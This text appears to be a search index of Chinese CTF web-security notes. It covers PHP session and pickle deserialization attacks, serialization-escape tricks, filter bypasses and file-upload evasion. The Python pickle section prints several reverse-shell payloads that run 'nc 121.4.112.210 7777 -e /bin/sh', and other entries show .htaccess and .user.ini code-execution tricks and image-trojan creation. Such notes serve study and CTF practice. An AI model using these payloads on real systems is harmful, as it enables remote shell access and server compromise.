\u901a\u8fc7\u7cbe\u5fc3\u6784\u9020\u7684\u6570\u636e\u5305\uff0c\u5c31\u53ef\u4ee5\u7ed5\u8fc7\u7a0b\u5e8f\u7684\u9a8c\u8bc1\u6216\u8005\u662f\u6267\u884c\u4e00\u4e9b\u7cfb\u7edf\u7684\u65b9\u6cd5 $_SESSION['hello'] = '|O:8:\"stdClass\":0:{}'; \u4e0a\u9762\u7684 $_SESSION \u6570\u636e\uff0c\u5728\u5b58\u50a8\u65f6\u4f7f\u7528\u7684\u5e8f\u5217\u5316\u5904\u7406\u5668\u4e3a php_serialize\uff0c\u5b58\u50a8\u7684\u683c\u5f0f\u5982\u4e0b: a:1:{s:5:\"hello\";s:20:\"|O:8:\"stdClass\":0:{}\";} \u5728\u8bfb\u53d6\u6570\u636e\u65f6\u5982\u679c\u7528\u7684\u53cd\u5e8f\u5217\u5316\u5904\u7406\u5668\u4e0d\u662f php_serialize\uff0c\u800c\u662f php \u7684\u8bdd\uff0c\u90a3\u4e48\u53cd\u5e8f\u5217\u5316\u540e\u7684\u6570\u636e\u5c06\u4f1a\u53d8\u6210\uff1a array(1) { [\"a:1:{s:5:\"hello\";s:20:\"\"]=> object(stdClass)#1 (0) { } } \u56e0\u4e3a\u5f53\u4f7f\u7528php\u5f15\u64ce\u7684\u65f6\u5019\uff0cphp\u5f15\u64ce\u4f1a\u4ee5 | \u4f5c\u4e3a\u4f5c\u4e3akey\u548cvalue\u7684\u5206\u9694\u7b26\uff0c\u90a3\u4e48\u5c31\u4f1a\u5c06 a:1:{s:5:\"hello\";s:20:\" \u4f5c\u4e3aSESSION\u7684key\uff0c\u5c06 O:8:\"stdClass\":0:{} \u4f5c\u4e3avalue\uff0c\u7136\u540e\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\uff0c\u6700\u540e\u5c31\u4f1a\u5f97\u5230stdClass\u8fd9\u4e2a\u7c7b\u3002","title":"php-session\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u6210\u56e0"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_6","text":"session.auto_start=Off // foo1.php <?php ini_set ( 'session.serialize_handler' , 'php_serialize' ); session_start (); $_SESSION [ 'test' ] = $_GET [ 'test' ]; ?> // foo2.php <?php session_start (); //\u6b64\u65f6\u9ed8\u8ba4\u4f7f\u7528php\u5f15\u64ce\u4e86 class test { var $hi ; function __wakeup () { echo 'hi,' ; } function __destruct () { echo $this -> hi ; } } \u8bbf\u95eefoo1\u521b\u5efasession\u5e76\u4ee5php-serialize\u5f15\u64ce\u65b9\u5f0f\u4fdd\u5b58\u672c\u5730\uff1a http://172.31.171.100/tmp/foo1.php?test=|O:4:\"test\":1:{s:2:\"hi\";s:4:John\";} \u518d\u8bbf\u95eefoo2\u4ee5php\u5f15\u64ce\u89e3\u6790\u672c\u5730session\u6587\u4ef6\uff0c\u53d1\u73b0\u6210\u529f\u6253\u5370\u51fa hi,John session.upload_progress \u5728php.ini\u6709\u4ee5\u4e0b\u51e0\u4e2a\u9ed8\u8ba4\u9009\u9879 session.upload_progress.enabled = on #\u5f53\u6d4f\u89c8\u5668\u5411\u670d\u52a1\u5668\u4e0a\u4f20\u4e00\u4e2a\u6587\u4ef6\u65f6\uff0cphp\u5c06\u4f1a\u628a\u6b64\u6b21\u6587\u4ef6\u4e0a\u4f20\u7684\u8be6\u7ec6\u4fe1\u606f(\u5982\u4e0a\u4f20\u65f6\u95f4\u3001\u4e0a\u4f20\u8fdb\u5ea6\u7b49)\u5b58\u50a8\u5728session\u5f53\u4e2d session.upload_progress.cleanup = on #\u5f53\u6587\u4ef6\u4e0a\u4f20\u7ed3\u675f\u540e\uff0cphp\u5c06\u4f1a\u7acb\u5373\u6e05\u7a7a\u5bf9\u5e94session\u6587\u4ef6\u4e2d\u7684\u5185\u5bb9\uff0c\u8fd9\u4e2a\u9009\u9879\u975e\u5e38\u91cd\u8981 session.upload_progress.prefix = \"upload_progress_\" session.upload_progress.name = \"PHP_SESSION_UPLOAD_PROGRESS\" session.upload_progress.freq = \"1%\" session.upload_progress.min_freq = \"1\" RCE < form action = \"http://e39d4115-3c33-4a6d-bd2c-2d2edb584f0d.chall.ctf.show:8080/\" method = \"POST\" enctype = \"multipart/form-data\" > < input type = \"text\" name = \"PHP_SESSION_UPLOAD_PROGRESS\" value = \"123\" /> < input type = \"file\" name = \"file\" id = \"file\" > < input type = \"submit\" name = \"submit\" value = \"submit\" > \u8fd9\u91cc\u9762\u7684\u4e00\u53e5\u8bdd\u6728\u9a6c\u5c31\u4f1a\u88ab\u5199\u5165sess_flag\u91cc\u9762 \u7531\u4e8e\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0csession.upload_progress.cleanup\u662f\u5f00\u542f\u7684\uff0c\u6240\u4ee5\u9700\u8981\u4f7f\u7528**\u6761\u4ef6\u7ade\u4e89**\uff0c\u8981\u8d76\u5728\u8fd8\u6ca1\u6709\u8bfb\u53d6\u5b8cpost\u5305\u4e0a\u4f20\u7684\u6570\u636e\u7684\u65f6\u5019\u5c31\u8bbf\u95ee\u5230\u8fd9\u4e2asess_flag\u6587\u4ef6\uff0c\u6267\u884c\u91cc\u9762\u7684\u4ee3\u7801 \u53cd\u5e8f\u5217\u5316 <?php //A webshell is wait for you ini_set ( 'session.serialize_handler' , 'php' ); session_start (); class OowoO { public $mdzz ; function __construct () { $this -> mdzz = 'phpinfo();' ; } function __destruct () { eval ( $this -> mdzz ); } } if ( isset ( $_GET [ 'phpinfo' ])) { $m = new OowoO (); } else { highlight_string ( file_get_contents ( 'index.php' )); } ?> \u53ef\u4ee5\u770b\u5230\u4e0a\u9762\u7684\u4ee3\u7801\u4e2d\u4f7f\u7528\u4e86php\u5f15\u64ce\uff0c\u4f46\u662f\u6ca1\u6709\u4ec0\u4e48\u53ef\u4ee5\u63a7\u5236\u5e8f\u5217\u5316\u7684\u70b9\u3002 \u901a\u8fc7\u67e5\u770bphpinfo\u53d1\u73b0session.upload_progress.enabled\u6253\u5f00\uff0c\u56e0\u6b64\u5c31\u53ef\u4ee5\u5229\u7528\u5176\u5411session\u4e2d\u5199\u5165\u6570\u636e\u3002 \u7b2c\u4e00\u6b65\u8ddfrce\u4e00\u6837\uff0c\u672c\u5730\u6784\u9020\u4e00\u4e2a\u5305\u542b PHP_SESSION_UPLOAD_PROGRESS \u7684POST\u6570\u636e\u5305\uff0c\u5728cookie\u4e2d\u6dfb\u52a0 PHPSESSID \u503c\u4e3a\u81ea\u5b9a\u4e49\u7684\u4efb\u610f\u5b57\u7b26\u4e32 \u63a5\u4e0b\u6765\u5c31\u8981\u6784\u9020payload\u4f5c\u4e3afilename\u7684\u503c\u63d0\u4ea4\uff0c\u4ece\u800c\u8d4b\u503c\u7ed9session <?php Class OowoO { public $mdzz = 'print_r(scandir(dirname(__FILE__)));' ; } $obj = new OowoO (); $ser = serialize ( $obj ); $ser = addslashes ( $ser ); $ser = str_replace ( \"O:5\" , \"|O:5\" , $ser ); echo $ser ; //|O:5:\\\"OowoO\\\":1:{s:4:\\\"mdzz\\\";s:36:\\\"print_r(scandir(dirname(__FILE__)));\\\";} PHPSESSID\u5fc5\u987b\u8981\u6709\uff0c\u56e0\u4e3a\u8981\u7ade\u4e89\u540c\u4e00\u4e2a\u6587\u4ef6 filename\u53ef\u63a7\uff0c\u4f46\u662f\u5728\u503c\u7684\u6700\u524d\u9762\u52a0\u4e0a | ,\u56e0\u4e3a\u6700\u7ec8\u76ee\u7684\u662f\u5229\u7528session\u7684\u53cd\u5e8f\u5217\u5316\uff0c PHP_SESSION_UPLOAD_PROGRESS \u53ea\u662f\u4e2a\u8df3\u677f \u5176\u6b21\u628a\u5b57\u7b26\u4e32\u4e2d\u7684\u53cc\u5f15\u53f7\u8f6c\u4e49\uff0c\u4ee5\u9632\u6b62\u4e0e\u6700\u5916\u5c42\u7684\u53cc\u5f15\u53f7\u51b2\u7a81 \u5728\u8fd9\u4e2a\u9875\u9762\u968f\u4fbf\u4e0a\u4f20\u4e00\u4e2a\u6587\u4ef6\uff0c\u7136\u540e\u6293\u5305\u4fee\u6539 filename \u7684\u503c\uff0cfilename\u7684\u503c\u4e5f\u5c31\u4f1a\u88ab\u5e8f\u5217\u5316\u8fdbsess_123\u6587\u4ef6\u4e2d\u4e86 \u6240\u4ee5\u603b\u7684\u6765\u8bf4\uff0c\u5229\u7528session.upload_progress\u7684\u524d\u63d0\u8fd8\u662f\u5f97\u5b58\u50a8session\u6570\u636e\u548c\u8bfb\u53d6session\u6570\u636e\u7684\u5f15\u64ce\u4e0d\u4e00\u81f4\uff0c\u8981\u6c42\u5b58\u50a8\u65f6\u662fphp_serialize\uff0c\u8bfb\u53d6\u65f6\u662fphp\u3002","title":"\u6f0f\u6d1e\u5229\u7528"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_7","text":"\u5b57\u7b26\u9003\u9038\u7684\u672c\u8d28\u5176\u5b9e\u4e5f\u662f\u95ed\u5408\uff0c\u4f46\u662f\u5b83\u5206\u4e3a\u4e24\u79cd\u60c5\u51b5\uff0c\u4e00\u662f\u5b57\u7b26\u53d8\u591a\uff0c\u4e8c\u662f\u5b57\u7b26\u53d8\u5c11","title":"\u53cd\u5e8f\u5217\u5316\u5b57\u7b26\u9003\u9038"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#web262","text":"**\u540e\u7aef**\u5bf9\u6211\u4eec\u8f93\u5165\u7684\u5e8f\u5217\u5316\u540e\u7684\u5b57\u7b26\u8fdb\u884c**\u66ff\u6362**\u6210\u4e3a**\u957f\u5ea6\u66f4\u957f**\u7684\u5b57\u7b26 function change($str){ return str_replace(\"x\",\"xx\",$str); } \u5c06x\u66ff\u6362\u4e3axx\uff0c\u518d\u8fdb\u884c\u53cd\u5e8f\u5217\u5316 \u7531\u4e8e\u53cd\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u6bcf\u4e2a\u7684\u683c\u5f0f\u7c7b\u4f3c\u4e8e s:4:\"play\" \uff0c\u7136\u800c\u7ecf\u8fc7\u66ff\u6362\u540e\u5b57\u7b26\u4e32\u957f\u5ea6\u53d8\u957f\uff0c\u548c\u524d\u9762\u7684\u6570\u5b57\u4e0d\u4e00\u81f4\u4e86\uff0c\u5bfc\u81f4\u53cd\u5e8f\u5217\u5316\u62a5\u9519 \u6211\u4eec\u4f20\u5165 name=maoxxxxxxxxxxxxxxxxxxxx\";i:1;s:6:\"woaini\";} \";i:1;s:6:\"woaini\";} \u8fd9\u4e00\u90e8\u5206\u4e00\u5171\u4e8c\u5341\u4e2a\u5b57\u7b26 20\u4e2ax\u88ab\u66ff\u6362\u4e3a40\u4e2a\uff0c\u591a\u51fa\u6765\u768420\u4e2ax\u5176\u5b9e\u53d6\u4ee3\u4e86\u6211\u4eec\u7684\u8fd9\u4e8c\u5341\u4e2a\u5b57\u7b26 \";i:1;s:6:\"woaini\";} \uff0c\u4ece\u800c\u9020\u6210 \";i:1;s:6:\"woaini\";} \u7684\u6ea2\u51fa \u800c\"\u95ed\u5408\u4e86\u524d\u4e32\uff0c\u4f7f\u5f97\u6211\u4eec\u7684\u5b57\u7b26\u4e32\u6210\u529f\u9003\u9038\uff0c\u53ef\u4ee5\u88ab\u53cd\u5e8f\u5217\u5316\uff0c\u8f93\u51fawoaini \u539f\u6765\u7684 \";i:1;s:7:\"I am 11\";}\" \u88ab\u820d\u5f03\uff0c\u4e0d\u5f71\u54cd\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b","title":"\u5b57\u7b26\u53d8\u591aweb262"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_8","text":"function change($str){ return str_replace(\"xx\",\"x\",$str); } \u4e24\u4e2axx\u88ab\u66ff\u6362\u4e3a\u4e00\u4e2ax\uff0c\u7136\u540e\u518d\u53cd\u5e8f\u5217\u5316 \u6211\u4eec\u8f93\u5165 name=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&age=11\";s:3:\"age\";s:6:\"woaini\";} \u5e8f\u5217\u5316\u540e\u7684\u7ed3\u679c\u662f s:3:\"age\";s:28:\"11\";s:3:\"age\";s:6:\"woaini\";}\" \u7531\u4e8e\u524d\u9762\u662f40\u4e2ax\u6240\u4ee5\u5bfc\u81f4\u5c11\u4e8620\u4e2a\u5b57\u7b26\uff0c\u6240\u4ee5\u9700\u8981\u540e\u9762\u6765\u8865\u4e0a\uff0c \";s:3:\"age\";s:28:\"11 \u8fd9\u4e00\u90e8\u5206\u521a\u597d20\u4e2a\uff0c\u540e\u9762\u7531\u4e8e\u6709 \" \u95ed\u5408\u4e86\u524d\u9762\u56e0\u6b64\u540e\u9762\u7684\u53c2\u6570\u5c31\u53ef\u4ee5\u7531\u6211\u4eec\u81ea\u5b9a\u4e49\u6267\u884c\u4e86","title":"\u5b57\u7b26\u53d8\u5c11"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#trick","text":"","title":"\u5c0ftrick"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#php71","text":"\u5982\u679c\u53d8\u91cf\u524d\u662f protected \uff0c\u5e8f\u5217\u5316\u7ed3\u679c\u4f1a\u5728\u53d8\u91cf\u540d\u524d\u52a0\u4e0a \\x00*\\x00 \u7279\u5b9a\u7248\u672c7.1\u4ee5\u4e0a\u5219\u5bf9\u4e8e\u7c7b\u5c5e\u6027\u4e0d\u654f\u611f\uff0c\u5373\u4f7f\u6ca1\u6709 \\x00*\\x00 \u4e5f\u6b63\u5e38\u53cd\u5e8f\u5217\u5316\u8d4b\u503c","title":"php7.1+\u53cd\u5e8f\u5217\u5316\u5bf9\u7c7b\u5c5e\u6027\u4e0d\u654f\u611f"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#__wakeupcve-2016-7124","text":"PHP5 < 5.6.25 PHP7 < 7.0.10 \u5229\u7528\u65b9\u5f0f\uff1a\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u4e2d\u8868\u793a\u5bf9\u8c61\u5c5e\u6027\u4e2a\u6570\u7684\u503c\u5927\u4e8e\u771f\u5b9e\u7684\u5c5e\u6027\u4e2a\u6570\u65f6\u4f1a\u8df3\u8fc7__wakeup\u7684\u6267\u884c \u628a O:4:\"test\":1:{s:1:\"a\";s:3:\"abc\";} \u6539\u4e3a O:4:\"test\":2:{s:1:\"a\";s:3:\"abc\";} \u5373\u53ef\u4e0d\u6267\u884c __wakeup \u65b9\u6cd5","title":"\u7ed5\u8fc7__wakeup(CVE-2016-7124)"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_9","text":"preg_match('/^O:\\d+/') \u5728\u53cd\u5e8f\u5217\u5316\u524d\u8fc7\u6ee4 O:4 \u5f00\u5934\u7684\u5b57\u7b26\u4e32 \u5982\u679c\u6b64\u65f6\u53cd\u5e8f\u5217\u5316\u6784\u9020\u4e3a $a = 'O:4:\"test\":1:{s:1:\"a\";s:3:\"abc\";}'; \u6cd5\u4e00\uff1a\u4f7f\u7528+\u7ed5\u8fc7 $b = str_replace('O:4','O:+4', $a); // O:+4:\"test\":1:{s:1:\"a\";s:3:\"abc\";} \u6cd5\u4e8c\uff1a\u5916\u9762\u518d\u5957\u4e2a\u6570\u7ec4 serialize(array($a)); // a:1:{i:0;O:4:\"test\":1:{s:1:\"a\";s:3:\"abc\";}} a:array\u4ee3\u8868\u662f\u6570\u7ec4\uff0c\u540e\u9762\u76841\u8bf4\u660e\u67091\u4e2a\u5c5e\u6027 i:\u4ee3\u8868\u662f\u6574\u578b\u6570\u636eint\uff0c\u540e\u9762\u76840\u662f\u6570\u7ec4\u4e0b\u6807 s:\u4ee3\u8868\u662f\u5b57\u7b26\u4e32\uff0c\u540e\u9762\u76843\u662f\u56e0\u4e3aabc\u957f\u5ea6\u4e3a3","title":"\u7ed5\u8fc7\u90e8\u5206\u6b63\u5219"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#web265","text":"<?php class test { public $a ; public $b ; public function __construct (){ $this -> a = 'abc' ; $this -> b = & $this -> a ; } ?> \u8fd9\u79cd\u65b9\u6cd5\u53ef\u4ee5\u5c06b\u8bbe\u4e3aa\u7684\u5f15\u7528\uff0c\u4ece\u800c\u7ed5\u8fc7\u4e00\u4e9b\u8fc7\u6ee4\u5224\u65ad <?php class ctfshowAdmin { public $token = \"dotast\" ; public $password = \"dotast\" ; public function login (){ return $this -> token === $this -> password ; } } $a = new ctfshowAdmin (); $a -> token =& $a -> password ; echo urlencode ( serialize ( $a )); // O:12:\"ctfshowAdmin\":2:{s:5:\"token\";s:6:\"dotast\";s:8:\"password\";R:2;} \u51fa\u73b0\u4e86\u4e0d\u5e38\u89c1\u7684 R \u53d8\u91cf","title":"\u5229\u7528\u5f15\u7528web265"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#16","text":"\u5c06\u5b57\u7b26\u4e32\u7684 s \u6539\u4e3a\u5927\u5199 S \u65f6\uff0c\u5176\u503c\u4f1a\u89e3\u6790 16 \u8fdb\u5236\u6570\u636e \u4f8b\u5982\uff1a O:4:\"Test\":1:{s:3:\"cmd\";s:6:\"whoami\";} \u53ef\u6539\u4e3a\uff1a O:4:\"Test\":1:{S:3:\"\\\\63md\";S:6:\"\\\\77hoami\";} \u4ece\u800c\u7ed5\u8fc7\u9488\u5bf9\u53d8\u91cf\u540d\u7684\u8fc7\u6ee4","title":"\u5229\u7528 16 \u8fdb\u5236\u7ed5\u8fc7\u8fc7\u6ee4"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#unserializewakeup","text":"\u5982\u679c __unserialize() \u548c __wakeup() \u4e24\u4e2a\u9b54\u672f\u65b9\u6cd5\u90fd\u5b9a\u4e49\u5728\u7528\u4e00\u4e2a\u5bf9\u8c61\u4e2d\uff0c \u5219\u53ea\u6709 __unserialize() \u65b9\u6cd5\u4f1a\u751f\u6548\uff0c __wakeup() \u65b9\u6cd5\u4f1a\u88ab\u5ffd\u7565","title":"\u540c\u65f6\u5b58\u5728unserialize\u548cwakeup"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","text":"Python\u53cd\u5e8f\u5217\u5316 \u00b6 ctfshow: web277&278 / backdoor ? data = m = base64 . b64decode ( data ) m = pickle . loads ( m ) \u628a\u4f20\u5165\u7684 data \u53c2\u6570\u8fdb\u884cbase64\u89e3\u7801\u540e\u53cd\u5e8f\u5217\u5316\uff0c\u6240\u4ee5\u4f7f\u7528 __reduce__() \u9b54\u672f\u65b9\u6cd5\u8fdb\u884c\u547d\u4ee4\u6267\u884c\u83b7\u5f97shell import pickle import base64 class A ( object ): def __reduce__ ( self ): return ( eval ,( '__import__(\"os\").popen(\"nc 121.4.112.210 7777 -e /bin/sh\").read()' ,)) a = A () test = pickle . dumps ( a ) print ( base64 . b64encode ( test )) \u6216\u8005 import pickle import base64 class A ( object ): def __reduce__ ( self ): return ( __import__ ( \"os\" ) . system , ( 'nc 121.4.112.210 7777 -e /bin/sh' ,)) a = A () test = pickle . dumps ( a ) print ( base64 . b64encode ( test )) \u6216\u8005 import pickle import base64 class A ( object ): def __reduce__ ( self ): return ( __import__ ( \"os\" ) . popen , ( 'nc 121.4.112.210 7777 -e /bin/sh' ,)) a = A () test = pickle . dumps ( a ) print ( base64 . b64encode ( test ))","title":"Python\u53cd\u5e8f\u5217\u5316"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#python","text":"ctfshow: web277&278 / backdoor ? data = m = base64 . b64decode ( data ) m = pickle . loads ( m ) \u628a\u4f20\u5165\u7684 data \u53c2\u6570\u8fdb\u884cbase64\u89e3\u7801\u540e\u53cd\u5e8f\u5217\u5316\uff0c\u6240\u4ee5\u4f7f\u7528 __reduce__() \u9b54\u672f\u65b9\u6cd5\u8fdb\u884c\u547d\u4ee4\u6267\u884c\u83b7\u5f97shell import pickle import base64 class A ( object ): def __reduce__ ( self ): return ( eval ,( '__import__(\"os\").popen(\"nc 121.4.112.210 7777 -e /bin/sh\").read()' ,)) a = A () test = pickle . dumps ( a ) print ( base64 . b64encode ( test )) \u6216\u8005 import pickle import base64 class A ( object ): def __reduce__ ( self ): return ( __import__ ( \"os\" ) . system , ( 'nc 121.4.112.210 7777 -e /bin/sh' ,)) a = A () test = pickle . dumps ( a ) print ( base64 . b64encode ( test )) \u6216\u8005 import pickle import base64 class A ( object ): def __reduce__ ( self ): return ( __import__ ( \"os\" ) . popen , ( 'nc 121.4.112.210 7777 -e /bin/sh' ,)) a = A () test = pickle . dumps ( a ) print ( base64 . b64encode ( test ))","title":"Python\u53cd\u5e8f\u5217\u5316"},{"location":"Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/","text":"\u4ee3\u7801\u5c42\u9762 \u00b6 \u524d\u7aef\u6821\u9a8c\u6587\u4ef6\u540e\u7f00 \u00b6 \u7981\u7528\u68c0\u6d4b\u7684js\u4ee3\u7801 \u4e0a\u4f20\u540e\u6293\u5305\u4fee\u6539filename\u53c2\u6570 Content-Type\u9650\u5236 \u00b6 \u4e0a\u4f20\u65f6\u6293\u5305\u4fee\u6539Content-type\u4e3a image/jpeg \u6587\u4ef6\u540e\u7f00\u540d\u68c0\u6d4b \u00b6 \u5927\u5c0f\u5199\u7ed5\u8fc7 . \u3001 _ \u548c\u7a7a\u683c\u7ed5\u8fc7\uff1a Windows\u7cfb\u7edf\u4e0b \uff0c\u6587\u4ef6\u540d\u540e\u7f00\u6700\u540e\u4e00\u4e2a . \u3001 _ \u548c\u7a7a\u683c\u4f1a\u88ab\u81ea\u52a8\u53bb\u9664\uff1b\u5e76\u4e14\u70b9+\u7a7a\u683c+\u70b9\u4e5f\u53ef\u4ee5\u5c1d\u8bd5\u7ed5\u8fc7\uff0c\u5982 xxx.php. . ::$DATA \u7ed5\u8fc7\uff1a Windows\u7cfb\u7edf\u4e0b \uff0c\u6587\u4ef6\u540d+ ::$DATA \u4f1a\u628aDATA\u4e4b\u540e\u7684\u6570\u636e\u5f53\u6210\u6587\u4ef6\u6d41\u5904\u7406,\u4e0d\u4f1a\u68c0\u6d4b\u540e\u7f00\u540d\uff0c\u5982 filename=\"test.php::$DATA\" \uff08\u4e00\u4e2a\u5192\u53f7\u4ec5\u521b\u5efa\u4e00\u4e2a\u7a7a\u6587\u4ef6\uff09 \u53cc\u5199\u7ed5\u8fc7\uff1a\u6709\u4e9b\u51fd\u6570\u4f1a\u66ff\u6362\u654f\u611f\u6587\u4ef6\u540d\uff0c\u4f46\u4e0d\u9012\u5f52\u5220\u9664\u7684\u8bdd\u5c31\u53ef\u4ee5\u53cc\u5199\u7ed5\u8fc7\uff0c\u4f8b\u5982 filename=a.phphpp 00\u622a\u65ad\u7ed5\u8fc7\uff1a\u4e0a\u4f20\u65f6\u4e0a\u4f20 a.php.jpg \uff0c\u6293\u5305\u5728php\u540e\u6dfb\u52a0\u4e00\u4e2a\u5b57\u7b26\u4fee\u6539\u5176HEX\u503c\u4e3a00\uff0c\u8fd9\u6837\u89e3\u6790\u4e4b\u540e\u5c31\u662f a.php \u4e86 \u6ee1\u8db3\u6761\u4ef6\uff1aphp\u7248\u672c\u5c0f\u4e8e5.3.4\uff1bphp.ini\u4e2dmagic_quotes_gpc = Off \u6269\u5c55\u540d\u66ff\u6362\uff1a asp/aspx: asp,aspx,asa,asax,ascx,ashx,asmx,cer,aSp,aSpx,aSa,aSax,aScx,aShx,aSmx,cEr php : php,php5,php4,php3,php2,pHp,pHp5,pHp4,pHp3,pHp2,html,htm,phtml,pht,Html,Htm,pHtml jsp : jsp,jspa,jspx,jsw,jsv,jspf,jtml,jSp,jSpx,jSpa,jSw,jSv,jSpf,jHtml .htaccess \u548c .user.ini \u7ed5\u8fc7\u9ed1\u540d\u5355\uff1a .htaccess \u53ea\u9002\u7528apache \u2460\u3001Allow Override All \u2461\u3001LoadModule rewrite_module modules/mod_rewrite.so #rewrite\u6a21\u5757\u4e3a\u5f00\u542f\u72b6\u6001 \u4e0a\u4f20 .htaccess \u6587\u4ef6\uff0c\u5199\u5165\uff1a \u65b9\u5f0f\u4e00\uff1aAddType application/x-httpd-php .jpg \u5c06\u6240\u6709\u540e\u7f00\u4e3a.jpg\u7684\u6587\u4ef6\u4f5c\u4e3aphp\u6587\u4ef6\u89e3\u6790 \u65b9\u5f0f\u4e8c\uff1a <FilesMatch \"*.jpg\"> SetHandler application/x-httpd-php #\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\uff0c\u5982\u679c\u5339\u914d\u5230.jpg\u6587\u4ef6\uff0c\u5219\u88ab\u89e3\u6790\u6210PHP\u4ee3\u7801\u6267\u884c AddHandler php5-script .jpg #\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\uff0c\u5982\u679c\u5339\u914d\u5230.jpg\u6587\u4ef6\uff0c\u5219\u88ab\u89e3\u6790\u6210PHP\u4ee3\u7801\u6267\u884c </FilesMatch> .user.ini \u9002\u7528\u4e8e\u670d\u52a1\u5668\u4f7f\u7528CGI\uff0fFastCGI\u6a21\u5f0f\u4e14\u76ee\u5f55\u4e0b\u8981\u6709\u53ef\u6267\u884c\u7684php\u6587\u4ef6 \u4e0a\u4f20 .user.ini \u6587\u4ef6\uff0c\u5199\u5165\uff1a auto_prepend_file = a.jpg a.jpg\u4e2d\u7b26\u5408php\u8bed\u8a00\u7684\u4ee3\u7801\u4f1a\u88ab\u6267\u884c auto_append_file = filename //\u5305\u542b\u5728\u6587\u4ef6\u5c3e \u5728\u6240\u6709php\u6267\u884c\u524d\u90fd\u4f1a\u5148include\u4e0a a.jpg \u8865\u5145\uff1a\u53ef\u4ee5\u8003\u8651\u5305\u542b\u65e5\u5fd7\u6587\u4ef6\uff0c\u7136\u540eUA\u4f20\u4e00\u53e5\u8bdd\u5199\u5165\u65e5\u5fd7 auto_prepend_file = /var/log/nginx/access.log \u914d\u5408\u76ee\u5f55\u89e3\u6790\u6f0f\u6d1e \u67e5\u770b\u54cd\u5e94\u5305Server\u4e2d\u663e\u793aIIS6.0\uff0c\u4fee\u6539\u4e0a\u4f20\u6587\u4ef6\u540d\u4e3a shell.php;jpg \u6216\u8005 shell.php;.jpg \uff0c\u7136\u540e\u8bbf\u95ee\u8fd9\u4e2a\u6587\u4ef6\u5373\u53ef\uff08\u8bbf\u95ee\u4e5f\u8981\u52a0\u4e0ajpg\uff09 \u76ee\u5f55\u89e3\u6790\u6f0f\u6d1e\uff1a\u4e0a\u4f20\u5230xxx.php\u8fd9\u4e2a\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u5c31\u4f1a\u88ab\u89e3\u6790\uff0c\u53ef\u4ee5\u5229\u7528%00\u622a\u65ad\u521b\u5efa\u6587\u4ef6\u5939\uff0c\u7136\u540e\u4e0a\u4f20\u5230\u8be5\u76ee\u5f55\u4e0b \u5229\u7528\u7cfb\u7edf\u7279\u6027 windows+php+iis\u4e2d\uff0c\u4e0a\u4f20 shell.php:.jpg \u4f1a\u521b\u5efa\u4e00\u4e2a\u7a7a\u7684shell.php\uff0c\u7136\u540e\u4e0a\u4f20 shell.<<< \u7684\u6587\u4ef6\u5c31\u53ef\u4ee5\u628a\u4e0a\u4f20\u7684\u5185\u5bb9\u5199\u5165\u6587\u4ef6\u4e86 \u6587\u4ef6\u5934\u68c0\u6d4b \u00b6 \u4e0a\u4f20\u56fe\u7247\u9a6c\uff0c\u5728\u4fee\u6539\u540e\u7f00\u4e3a\u53ef\u89e3\u6790\u811a\u672c\u8bed\u8a00\uff1b cmd\u547d\u4ee4 copy 1.png/b+2.php/a 3.png \u5236\u4f5c\u56fe\u7247\u9a6c \u6216\u8005\u4e0a\u4f20\u4e00\u53e5\u8bdd\u6728\u9a6c\u5728\u6587\u4ef6\u4e2d\u6dfb\u52a0\u6b63\u5e38\u683c\u5f0f\u6587\u4ef6\u5934\u4f8b\u5982\uff1a GIF89a \u3001png\u6587\u4ef6\u5934 89504E47 